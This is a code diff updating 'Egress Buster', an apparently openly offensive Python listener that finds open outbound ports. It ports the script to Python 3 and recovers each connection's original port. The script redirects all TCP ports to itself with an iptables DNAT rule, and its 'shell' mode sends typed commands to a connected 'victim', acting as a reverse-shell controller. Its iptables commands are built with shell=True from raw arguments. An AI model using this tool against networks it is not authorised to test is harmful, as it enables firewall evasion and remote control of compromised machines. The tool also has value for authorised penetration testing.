@@ -6,15 +6,21 @@
 #
 # Listener can only be run on Linux due to iptables support.
 #
-import SocketServer
+try:
+    import SocketServer
+except ImportError:
+    import socketserver as SocketServer
 import subprocess
 import sys
 import threading
 import time
+import socket
+import struct
+
+SO_ORIGINAL_DST = 80
 
 # define empty variable
 shell = ""
-port = 1090
 running = True
 
 # assign arg params
@@ -25,8 +31,8 @@ try:
 
 # if we didnt put anything in args
 except IndexError:
-    print """
-Egress Buster v0.3 - Find open ports inside a network
+    print("""
+Egress Buster v0.4 - Find open ports inside a network
 
 This will route all ports to a local port and listen on every port. This
 means you can listen on all ports and try all ports as a way to egress bust.
@@ -40,7 +46,7 @@ Usage: $ python egress_listener.py <your_local_ip_addr> <eth_interface_for_liste
 Set src_ip_to_listen_for to 0.0.0.0/0 to listen to connections from any IP, otherwise set a specific IP/CIDR and only connections from that source will be redirected to the listener.
 
 Example: $ python egress_listener.py 192.168.13.10 eth0 117.123.98.4 shell
-        """
+        """)
     sys.exit()
 
 # assign shell
@@ -54,8 +60,12 @@ except:
 class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
     # handle the packet
     def handle(self):
+        port = struct.unpack(
+            '!HHBBBB',
+            self.request.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)[:8]
+        )[1]  # (proto, port, IPa, IPb, IPc, IPd)
         self.data = self.request.recv(1024).strip()
-        print "[*] Connected from %s on port: %s/tcp" % (self.client_address[0], self.data)
+        print("[*] Connected from %s on port: %d/tcp (client reported %s)" % (self.client_address[0], port, self.data))
         if shell == "shell":
             while running:
                 request = raw_input("Enter the command to send to the victim: ")
@@ -65,7 +75,7 @@ class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
                         break
                     try:
                         self.data = self.request.recv(1024).strip()
-                        print self.data
+                        print(self.data)
                     except:
                         pass
         return
@@ -77,30 +87,39 @@ class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pa
 if __name__ == "__main__":
 
     try:
+        # threaded server to handle multiple TCP connections
+        socketserver = ThreadedTCPServer(('', 0), ThreadedTCPRequestHandler)
+        socketserver_thread = threading.Thread(target=socketserver.serve_forever)
+        socketserver_thread.setDaemon(True)
+        socketserver_thread.start()
+        port = socketserver.server_address[1]
+
         if srcipaddr == "0.0.0.0/0":
             listening = "any IP"
         else:
             listening = srcipaddr
 
-        print "[*] Inserting iptables rule to redirect connections from %s to **all TCP ports** to Egress Buster port %s/tcp" % (listening, port)
-        subprocess.Popen(
-            "iptables -t nat -A PREROUTING -s %s -i %s -p tcp  --dport 1:65535 -j DNAT --to-destination %s:%s" % (srcipaddr, eth, ipaddr, port), shell=True).wait()
-        # threaded server to handle multiple TCP connections
-        socketserver = ThreadedTCPServer(('', port), ThreadedTCPRequestHandler)
-        socketserver_thread = threading.Thread(target=socketserver.serve_forever)
-        socketserver_thread.setDaemon(True)
-        socketserver_thread.start()
-        print "[*] Listening on all TCP ports now... Press control-c when finished."
+        print("[*] Inserting iptables rule to redirect connections from %s to **all TCP ports** to Egress Buster port %s/tcp" % (listening, port))
+        ret = subprocess.Popen(
+            "iptables -t nat -A PREROUTING -s %s -i %s -p tcp  --dport 1:65535 -j DNAT --to-destination %s:%s" % (srcipaddr, eth, ipaddr, port),
+            shell=True
+        ).wait()
+        if ret != 0:
+            raise Exception('failed to set iptables rule (code %d), aborting' % ret)
+        print("[*] Listening on all TCP ports now... Press control-c when finished.")
 
         while running:
             time.sleep(1)
 
     except KeyboardInterrupt:
         running = False
-    except Exception, e:
-        print "[!] An issue occurred. Error: " + str(e)
+    except Exception as e:
+        print("[!] An issue occurred. Error: " + str(e))
     finally:
-        print "\n[*] Exiting and removing iptables redirect rule."
-        subprocess.Popen("iptables -t nat -D PREROUTING -s %s -i %s -p tcp  --dport 1:65535 -j DNAT --to-destination %s:%s" % (srcipaddr, eth, ipaddr, port), shell=True).wait()
-    print "[*] Done"
+        print("\n[*] Exiting and removing iptables redirect rule.")
+        subprocess.Popen(
+            "iptables -t nat -D PREROUTING -s %s -i %s -p tcp  --dport 1:65535 -j DNAT --to-destination %s:%s" % (srcipaddr, eth, ipaddr, port),
+            shell=True
+        ).wait()
+    print("[*] Done")
     sys.exit()
